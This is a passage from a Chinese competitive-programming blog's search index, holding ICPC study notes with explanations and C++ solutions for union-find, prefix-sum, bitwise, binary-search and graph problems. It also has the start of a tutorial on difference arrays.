\u003e\u003e k; priority_queue\u003cll, vector\u003cll\u003e, less\u003cll\u003e\u003e que; ll temp = 0; for(int i = 1; i \u003c= k; i++){ temp += b[i]; que.push(b[i]); } ll ans = sum[k] + temp; for(int i = k + 1; i \u003c= n; i++){ if(que.top() \u003e b[i]){ temp -= que.top(); temp += b[i]; que.pop(); que.push(b[i]); ans = min(ans, sum[i] + temp); } } cout \u003c\u003c ans \u003c\u003c '\\n'; } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:3","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"P10179 水影若深蓝 并查集\r思路\r判断连通性，使用并查集。 将所有m并在一起，说明这个连通块每个点到fa的距离都为2。 若合并完后只有一个连通块且n!=1，显然为No，因为没有到fa距离为1的点 否则，任选两个连通块A、B，将faA、faB连起来，sonA与faB相连，sonB与其他点与faA相连。此时满足条件 代码\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; struct node{ int u, v; }f[300010]; int fa[300010]; int find(int x){ if(fa[x] != x){ fa[x] = find(fa[x]); } return fa[x]; } void solve(){ int n, m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++) fa[i] = i; for(int i = 1; i \u003c= m; i++){ cin \u003e\u003e f[i].u \u003e\u003e f[i].v; int x = find(f[i].u), y = find(f[i].v); fa[x] = y; } int cnt = 0, center[2]; for(int i = 1; i \u003c= n; i++){ if(find(i) == i){ if(cnt \u003c 2) center[cnt] = i; cnt++; } } if(cnt == 1 \u0026\u0026 n == 1){ cout \u003c\u003c \"Yes\" \u003c\u003c '\\n'; return; } if(cnt == 1 \u0026\u0026 n \u003e 1){ cout \u003c\u003c \"No\" \u003c\u003c '\\n'; return; } cout \u003c\u003c \"Yes\" \u003c\u003c '\\n'; cout \u003c\u003c center[0] \u003c\u003c ' ' \u003c\u003c center[1] \u003c\u003c '\\n'; for(int i = 1; i \u003c= n; i++){ if(i == center[0] || i == center[1]) continue; if(find(i) == center[0]) cout \u003c\u003c i \u003c\u003c ' ' \u003c\u003c center[1] \u003c\u003c '\\n'; else cout \u003c\u003c i \u003c\u003c ' ' \u003c\u003c center[0] \u003c\u003c '\\n'; } } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:4","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"P10180 半彩三重奏 可撤销并查集\r题意\r思路\r题解\rcode\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 1e6 + 10; ll fa[N], siz[N], cor[N]; ll find(ll x){ if(fa[x] != x){ fa[x] = find(fa[x]); } return fa[x]; } void add(ll x, ll y){ int fx = find(x), fy = find(y); if(fx == fy) return; fa[fy] = fx; siz[fx] += siz[fy]; } unordered_map\u003cll, ll\u003e mp; vector\u003cpair\u003cll, ll\u003e \u003e g[N]; ll cnt = 0; struct node{ ll x, y; }e[N]; int find1(ll x){ if(fa[x] == x) return x; return find1(fa[x]); } stack\u003cll\u003e stk1; stack\u003cpair\u003cll,ll\u003e\u003e stk2; void merge(int x, int y){ int xx = find1(x), yy = find1(y); if(siz[xx] \u003e siz[yy]) swap(xx, yy); stk1.push(xx); stk2.emplace(yy, siz[yy]); fa[xx] = yy; siz[yy] += siz[xx]; } void undo(){ fa[stk1.top()] = stk1.top(); stk1.pop(); siz[stk2.top().first] = stk2.top().second; stk2.pop(); } ll inans[N], stans[N]; void solve(){ ll n, k; cin \u003e\u003e n \u003e\u003e k; for(ll i = 1; i \u003c= n; i++) cin \u003e\u003e cor[i], fa[i] = i, siz[i] = 1; for(ll i = 2; i \u003c= n; i++){ cin \u003e\u003e e[i].x; e[i].y = i; if(cor[e[i].x] == cor[e[i].y]){ add(e[i].x, e[i].y); }else{ ll tmp; if(cor[e[i].x] \u003c cor[e[i].y]) tmp = cor[e[i].x] * 1e6 + cor[e[i].y]; else tmp = cor[e[i].y] * 1e6 + cor[e[i].x]; if(mp.find(tmp) == mp.end()) mp[tmp] = ++cnt; g[mp[tmp]].emplace_back(e[i].x, e[i].y); } } for(ll i = 1; i \u003c= n; i++){ if(find(i) == i){ inans[cor[i]] += siz[i] * siz[i]; } } for(ll i = 1; i \u003c= cnt; i++){ for(ll j = 0; j \u003c g[i].size(); j++){ ll xx = find1(g[i][j].first), yy = find1(g[i][j].second); stans[i] += (ll)siz[xx] * (ll)siz[yy] * 2; merge(g[i][j].first, g[i][j].second); } for(ll j = 0; j \u003c g[i].size(); j++) undo(); } while (k--){ ll x, y; cin \u003e\u003e x \u003e\u003e y; ll ans = inans[x] + inans[y]; if(x \u003e y) swap(x, y); ll tmp = x * 1e6 + y; if(g[mp[tmp]].size() == 0) cout \u003c\u003c ans \u003c\u003c '\\n'; else cout \u003c\u003c (ll)(ans + stans[mp[tmp]]) \u003c\u003c '\\n'; } } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:5","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"D-小红的好串 前缀和 子串变形\r思路\r不难发现好串就是尽可能平均分配。 根据len % 3可以分类讨论：令t = len / 3 %= 0:平均 %= 1：t, t, t + 1、t, t + 1, t、t+1,t,t三种情况中的最小值 %=2：同上也是三种情况的最小值。 注意len \u003c 2的时候值为0 考虑到枚举是O(N^2)必然TLE。 发现更改后的字符串是由三组连续的字符组成。则分三段思考，每一段都是变为一个字符C，那么用前缀和就可以维护一段区间都变成字符C的最小次数。因此预处理三个前缀和，即可 代码\r#include\u003cbits/stdc++.h\u003e using namespace std; int sum[100010][4]; int solve(int l, int r, int c){ return sum[r][c] - sum[l - 1][c]; } int main(){ string s; int n, q; cin \u003e\u003e n \u003e\u003e q; cin \u003e\u003e s; s = '?' + s; for(int i = 1; i \u003c= n; i++){ if(s[i] == 'r'){ sum[i][1] = sum[i - 1][1]; sum[i][2] = sum[i - 1][2] + 1; sum[i][3] = sum[i - 1][3] + 1; } if(s[i] == 'e'){ sum[i][1] = sum[i - 1][1] + 1; sum[i][2] = sum[i - 1][2]; sum[i][3] = sum[i - 1][3] + 1; } if(s[i] == 'd'){ sum[i][1] = sum[i - 1][1] + 1; sum[i][2] = sum[i - 1][2] + 1; sum[i][3] = sum[i - 1][3]; } } while(q--){ int l, r; cin \u003e\u003e l \u003e\u003e r; int len = r - l + 1; if(len \u003c= 2) { cout \u003c\u003c 0 \u003c\u003c '\\n'; } else{ int ans = len; int d = len / 3; if(len % 3 == 0){ ans = min(ans, solve(l, l + d - 1, 1) + solve(l + d, l + 2 * d - 1, 2) + solve(l + 2 * d, r, 3)); }else if(len % 3 == 2){ ans = min(ans, solve(l, l + d - 1, 1) + solve(l + d, l + 2 * d, 2) + solve(l + 2 * d + 1, r, 3)); ans = min(ans, solve(l, l + d, 1) + solve(l + d + 1, l + 2 * d, 2) + solve(l + 2 * d + 1, r, 3)); ans = min(ans, solve(l, l + d, 1) + solve(l + d + 1, l + 2 * d + 1, 2) + solve(l + 2 * d + 2, r, 3)); }else{ ans = min(ans, solve(l, l + d, 1) + solve(l + d + 1, l + 2 * d, 2) + solve(l + 2 * d + 1, r, 3)); ans = min(ans,solve(l, l + d - 1, 1) + solve(l + d, l + 2 * d, 2) + solve(l + 2 * d + 1, r , 3)); ans = min(ans,solve(l, l + d - 1, 1) + solve(l + d, l + 2 * d - 1, 2) + solve(l + 2 * d, r, 3)); } cout \u003c\u003c ans \u003c\u003c '\\n'; } } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:6","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"位运算\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:3:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"D. Birthday Gift\r题意：\r将数组划分为k个连续段，使得： 求出每个连续段的异或和 这些异或和作或运算，最终答案小于等于x 。 求最大的k，或报告这不可能(输出-1）。 题解：\r拆位，单独思考每一位 若要让最终结果的每一位为0，那么这一位的1的数量必然为偶数个，否则这一位为1 令x++，使\u003c=变为\u003c；若要满足最终答案小于x则x为0的地方最终结果必然为0，即该位的1的数量为偶数个。对于x为1的地方，让x这一位和最终结果这一位均为0同时高位一致或最终结果对应位为0，此时低位任意均满足条件，则此时答案即为高位满足条件的连续段的个数。 使用一个二进制串state用于check高位是否满足条件，使用异或前缀和进行高位检验。要检验高位是否满足条件，若高位为0，则必须为0，若为1，则0、1都可以，所以只需要检验高位中为0的数位，所以令state中只有高位的0位置是1。使用异或前缀和\u0026state,若值为0（高位对应为0的地方都为0，其他地方无所谓），说明是该前缀和到上一个值为0的前缀和之间的段是可行的段。遍历一遍前缀和求所有\u0026之后值为0的数量即为ans。 从高到低枚举x的每一位，若该位为0，判断若这一位1的数量为奇数，则结束，否则令state中这一位为1。若为1，如果这一位1的数量为偶数则check（注意check用的state认定这一位是0）并更新答案。 代码：\rvoid solve() { int n, x; cin \u003e\u003e n \u003e\u003e x; vector\u003cint\u003e a(n + 1), pre(n + 1, 0); int cnt[31]{}; for(int i = 1; i \u003c= n; i++){ cin \u003e\u003e a[i]; pre[i] = pre[i - 1] ^ a[i];//异或前缀和 for(int j = 0; j \u003c= 30; j++) cnt[j] += (a[i] \u003e\u003e j \u0026 1);//统计每一位1的个数 } if(pre[n] \u003e x){ cout \u003c\u003c -1 \u003c\u003c '\\n'; return; } x += 1;// sum \u003c= x -\u003e sum \u003c x + 1 auto solve = [\u0026](int state){ int ans = 0; for(int i = 1; i \u003c= n; i++){ ans += (pre[i] \u0026 state) == 0; } return ans; }; int ans = 0, state = 0; for(int i = 30; i \u003e= 0; i--){ int bit = x \u003e\u003e i \u0026 1; if(bit == 1){ if(cnt[i] % 2 == 0){ ans = max(ans, solve(state | (1 \u003c\u003c i)));//state | (1 \u003c\u003c i) 本位为0去check } }else{ if(cnt[i] % 2) break; state |= 1 \u003c\u003c i; } } cout \u003c\u003c ans \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:3:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"D - Popcount and XOR (atcoder.jp)\r题意\r题解\r代码\rll f[64]; ll x[64]; ll y[64]; ll ksm(ll a, ll b){ ll ret = 1; while(b){ if(b \u0026 1) ret = (ret * a); a = a * a; b \u003e\u003e= 1; } return ret; } void solve(){ ll a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; ll cnt = 0; for(ll i = 63; i \u003e= 0; i--){ f[i] = c \u003e\u003e i \u0026 1; if(f[i]) cnt++; } if((a + b + cnt) % 2 != 0 || a + b + cnt \u003e 120 || a \u003e b + cnt || b \u003e cnt + a || cnt \u003e a + b){ cout \u003c\u003c \"-1\" \u003c\u003c endl; return; } ll d = (a + b - cnt) / 2; ll cnta = 0; ll tara = a - d; for(ll i = 0; i \u003c 64; i++){ if(f[i]){ if(cnta \u003c tara){ x[i] = 1; cnta++; }else{ y[i] = 1; } } } for(ll i = 0; i \u003c 64; i++){ if(d \u003e 0){ if(x[i] || y[i]) continue; x[i] = y[i] = 1; d--; } } ll ansa = 0, ansb = 0; for(ll i = 0; i \u003c 64; i++){ ansa += x[i] * ksm(2, i); ansb += y[i] * ksm(2, i); } cout \u003c\u003c ansa \u003c\u003c ' ' \u003c\u003c ansb; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:3:2","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"[Problem - B - Codeforces] 任意分配 二进制贪心\r思路\r能够进行n次操作，每次操作选择i,j,x 令a_i = a_i + x, a_j = a_j - x 因为可以进行n次操作，所以可以实现任意分配： 1.先将全部数聚集到一个位置（假设为1）上，使用n-1次操作 2.任意分配使用n-1次操作 3.实际分配时省略1，n次操作完全可以实现任意分配 要求求所有数或之后的最小值，涉及到二进制时在二进制下考虑，由于可以实现任意分配，则变为在二进制中分配1。 考虑某一位不用放1的情况即为，在这一位之前的位可以将sum全部放下，即sum \u003c= ((1 « pos) - 1)*n。此时不需要在pos位放数，因为二进制情况下，pos位以下所有2的幂次的和小于2的pos次方。 当这一位一定需要放1的时候，那么尽可能放最多的1，因为或情况下只要这一位只要有1个1，这一位就有贡献，所以放最多的1是最好的方案，x=min(n, sum/(1 « pos) ) code\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; ll a[200010]; ll ans[33]; void solve(){ ll n; cin \u003e\u003e n; ll sum = 0; for(ll i = 1; i \u003c= n; i++) cin \u003e\u003e a[i], sum += a[i]; for(ll i = 31; i \u003e= 0; i--){ if(sum \u003c= ((1 \u003c\u003c i) - 1) * n) continue; ll x = min(n, sum / (1 \u003c\u003c i)); ans[i] = 1; sum -= x * (1 \u003c\u003c i); } ll ret = 0; for(ll i = 0; i \u003c= 32; i++){ if(ans[i]){ ret += (1 \u003c\u003c i); } } cout \u003c\u003c ret; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:3:3","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"二分查找\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:4:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"C. Tree Cutting\r题意：\rn个点，n-1条边，问严格去除k条边后剩下的连通块中最小值的最大值是多少。 题解：\r注意到答案具有单调性，可以考虑二分查找最大值。 check过程：dfs，对于pos节点，dfs其子节点，如果siz[子节点] \u003c mid 那么这个子树不可以去掉，如果 \u003e= mid 说明这个子树可以去掉 cnt++，dfs过程中统计可以去掉的数量cnt。结束后检验siz[1]是否\u003c mid，如果是则需要cnt–(这时1所在连通块之外的连通块结点数均\u003e= mid, 任意连一边即可)。比较cnt和mid，如果cnt \u003e= mid（cnt次操作满足条件，更少操作肯定满足） 则为true, 否则为false 代码:\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 1e5 + 10; vector\u003cint\u003e g[100010]; int siz[100010]; priority_queue\u003cint, vector\u003cint\u003e, greater\u003cint\u003e \u003e que; int cnt = 0; int n, k; int ans = 0; void dfs(int pos,int fa, int x){ siz[pos] = 1; for(int v : g[pos]){ if(v == fa) continue; dfs(v, pos, x); if(siz[v] \u003e= x) ans++; else siz[pos] += siz[v]; } } bool check(int x){ ans = 0; dfs(1, 0, x); if(siz[1] \u003c x) ans--; return ans \u003e= k; } void solve(){ cin \u003e\u003e n \u003e\u003e k; for(int i = 1; i \u003c= n; i++){ g[i].clear(), siz[i] = 0; } for(int i = 0; i \u003c n - 1; i++){ int u, v; cin \u003e\u003e u \u003e\u003e v; g[u].push_back(v); g[v].push_back(u); } int l = 1, r = n; int ret = 0; while(l \u003c= r){ int mid = (l + r) \u003e\u003e 1; if(check(mid)){ ret = mid; l = mid + 1; }else{ r = mid - 1; } } cout \u003c\u003c ret \u003c\u003c '\\n'; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:4:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"图论\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:5:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"[P3469 POI2008] BLO-Blockade\r思路\r请你对于每个节点 i 求出，把与节点 i 关联的所有边去掉以后（不去掉节点 i*本身），无向图有多少个有序点 （x,*y)，满足 x 和 y 不连通。 找割点。 若点i不是割点，显然答案为2 * （n - 1) 若点i是割点，则去掉点i后的每一个子树（分为两部分，回退边low \u003e= num[i]的子树和low\u003cnum[i]的子树）都和其他子树间的点构成满足条件的有序点对，ans += siz[i] * (n - siz[i])。其次加上点i与其他点构成的有序对ans += n - 1。 code\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 100010; ll low[N], num[N], dfn, siz[N]; bool iscut[N]; vector\u003cint\u003e g[N]; int root; ll ans[N]; int n, m; void dfs(int pos, int fa){ low[pos] = num[pos] = ++dfn; siz[pos] = 1; ll r = n - 1; ans[pos] = r;//本身 for(int i = 0; i \u003c g[pos].size(); i++){ int y = g[pos][i]; if(!num[y]){ dfs(y, pos); siz[pos] += siz[y]; low[pos] = min(low[pos], low[y]); if(low[y] \u003e= num[pos]){ ans[pos] += (n - siz[y]) * siz[y], r -= siz[y];//导致成为割点的子块 } }else if(num[y] \u003c num[pos] \u0026\u0026 y != fa){ low[pos] = min(low[pos], num[y]); } } ans[pos] += r * (n - r);//不导致成为割点的子块 } void solve(){ cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= m; i++){ int x, y; cin \u003e\u003e x \u003e\u003e y; g[x].push_back(y); g[y].push_back(x); } root = 1, dfs(1, 1); for(int i = 1; i \u003c= n; i++) cout \u003c\u003c ans[i] \u003c\u003c '\\n'; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:5:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E - Clique Connect (最小生成树)\r思路\rcode\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 200010; ll st[N]; unordered_map\u003cll, ll\u003e mp; struct node{ ll cost; vector\u003cll\u003e ver; }f[N]; bool cmp(struct node a, struct node b){ if(a.cost == b.cost){ return a.ver.size() \u003e b.ver.size(); } return a.cost \u003c b.cost; } int fa[N]; int find(int x){ if(fa[x] != x){ fa[x] = find(fa[x]); } return fa[x]; } bool add(int a, int b){ int faa = find(a), fbb = find(b); if(faa == fbb) return false; fa[faa] = fbb; return true; } void solve(){ ll n, m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++){ fa[i] = i; } for(ll i = 1; i \u003c= m; i++){ ll k, c; cin \u003e\u003e k \u003e\u003e c; f[i].cost = c; for(ll j = 1; j \u003c= k; j++){ ll tmp; cin \u003e\u003e tmp; f[i].ver.push_back(tmp); } } ll cnt = n; ll ans = 0; sort(f + 1, f + 1 + m, cmp); for(int i = 1; i \u003c= m; i++){ for(int j = 1; j \u003c f[i].ver.size(); j++){ if(add(f[i].ver[j], f[i].ver[j - 1])){ ans += f[i].cost; cnt--; } } } if(cnt \u003e 1) cout \u003c\u003c -1; else cout \u003c\u003c ans; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:5:2","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"构造 思维\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:6:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"Problem - D - Codeforces\r思路\rcode\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; void solve(){ int n, k; cin \u003e\u003e n \u003e\u003e k; int st = 1; int t = k; vector\u003cint\u003e ans; if(k == 1){ ans.push_back(2); ans.push_back(3); ans.push_back(4); st = 8; for(int i = 3; i \u003c= 24; i++){ ans.push_back(st); st *= 2; } cout \u003c\u003c ans.size() \u003c\u003c endl; for(auto it : ans){ cout \u003c\u003c it \u003c\u003c ' '; } cout \u003c\u003c endl; return; } while(st \u003c t){ ans.push_back(st); t -= st; st *= 2; } if(t - 1) ans.push_back(t - 1); ans.push_back(k + 1); ans.push_back(k * 2 + 1); ans.push_back(k * 3 + 1); ans.push_back(k * 4 + 1); st = k * 8 + 1; int len = ans.size(); for(int i = len + 1; i \u003c= 25 ; i ++){ ans.push_back(st); st = st * 2 - 1; } cout \u003c\u003c ans.size() \u003c\u003c endl; for(auto it : ans){ cout \u003c\u003c it \u003c\u003c ' '; } cout \u003c\u003c endl; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:6:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"比赛\r【LGR-177-Div.3】洛谷基础赛 #8 \u0026 Westlake OI #1 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) Tasks - Toyota Programming Contest 2024#3（AtCoder Beginner Contest 344） F、G Dashboard - Codeforces Round 931 (Div. 2) - Codeforces ","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:7:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["算法和数据结构"],"content":"【数组】 差分\r","date":"2024-06-11","objectID":"/posts/%E5%B7%AE%E5%88%86/:0:0","tags":["算法"],"title":"差分","uri":"/posts/%E5%B7%AE%E5%88%86/"},{"categories":["算法和数据结构"],"content":"前缀和 与 差分\r我在前面的两篇博客里面简要介绍了一下一维、二维数组的前缀和的一些知识点，提到前缀和，那很自然地就会提到差分的概念。 首先我们回顾一下前缀和：原数组a[n]和依据原数组构造出的新数组s[n]，s[n]是a[n]的前缀和数组。 俗话说，有来有往，阴阳交汇，分久必合、合久必分…… 总而言之，我们看到了新数组s[n]是原数组a[n]的前缀和数组，但我们都知道，事物之间的影响总是交互的，所以我们必然会想到原数组a[n]是新数组s[n]的什么？只是前缀和数组的原数组吗？ 现在让我们先把注意力投向求前缀和数组的公式： s[n] = s[n-1] + a[n];现在让我们抛开s[n]相对于a[n]前缀和的身份不谈，我们有一个普通s[n]，它的每一项s[n]都基于上一向s[n-1]的值 再加上一个常数a[n]。 这个常数a[n]正是数组s[n]与s[n-1]的差值。 那么我们变换公式：a[n] = s[n] - s[n-1]。 由此我们得到一个新但旧的数组即原数组，a[n]，称为s[n]数组的差分数组。 结论：s[n]是原数组a[n]的前缀和数组、a[n]是原数组s[n]的差分数组。 ","date":"2024-06-11","objectID":"/posts/%E5%B7%AE%E5%88%86/:1:0","tags":["算法"],"title":"差分","uri":"/posts/%E5%B7%AE%E5%88%86/"},{"categories":["算法和数据结构"],"content":"差分数组的用处\r差分数组和前缀和数组的用途相似，都是面对以区间为单位进行操作的需求。 差分将对区间进行的增减操作由O(n)优化为O(1)。 以下给出一道题目： 题目描述：\r输入一个长度为 n的整数序列。接下来输入 m个操作，每个操作包含三个整数 l,r,c，表示将序列中 [l,r]之间的每个数加上 c。\r请你输出进行完所有操作后的序列。我们需要对一个区间进行加减操作，如果按照朴素思想，我们需要从左端点遍历都右端点，时间复杂度为O(n)。进行m次操作的时间复杂度就是O(mn)。 而对差分数组进行操作，再求一遍前缀和的时间复杂度是O(m+n)如图，对查分数组的某一个元素+1，则原数组从这个元素开始的元素都会加一。因此，再让区间外的第一个元素减一就能实现这个区间内的元素加一，以此类推。 { #include \u003ciostream\u003e #define N 100010 using namespace std; int f[N]; int s[N]; int main() { int n,m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++) { cin \u003e\u003e f[i]; s[i] = f[i] - f[i-1]; } while(m--) { int l,r,c; cin \u003e\u003e l \u003e\u003e r \u003e\u003e c; s[l] += c; s[r+1] -= c; } for(int i =1 ; i \u003c= n; i++) { f[i] = f[i-1] + s[i]; cout \u003c\u003c f[i] \u003c\u003c ' '; } } }","date":"2024-06-11","objectID":"/posts/%E5%B7%AE%E5%88%86/:2:0","tags":["算法"],"title":"差分","uri":"/posts/%E5%B7%AE%E5%88%86/"},{"categories":["算法和数据结构"],"content":"二维差分\r同样地，二维数组也有差分。其目的仍然是对区间(子矩阵)进行操作。 在一维数组中，我们改变原数组的某一元素，会改变前缀和数组一段区间的值。 同样，在二维数组中，我们改变原数组的某一元素，会改变前缀和数组一个子矩阵的值。 首先，二维数组前缀和的几何意义是，从矩阵左上角到该元素的元素和。如图中的前缀和数组的(i,j)元素表示的是原数组绿色部分的元素和。 那么我们给这个原数组中元素加上一个1，前缀和数组在下图中的黄色部分都会加上一个1（该元素到矩阵右下角）。现在我们要让蓝色部分加上一个值X，但显然这样操作仍会对黄色部分加上值X。那么我们再让黄色区域减去这个X即可，同一维的是一个道理，注意重复的地方要加上一个X。 例题 2536. 子矩阵元素加 1 class Solution { public: vector\u003cvector\u003cint\u003e\u003e rangeAddQueries(int n, vector\u003cvector\u003cint\u003e\u003e\u0026 queries) { vector\u003cvector\u003cint\u003e\u003e tmp(n+1 , 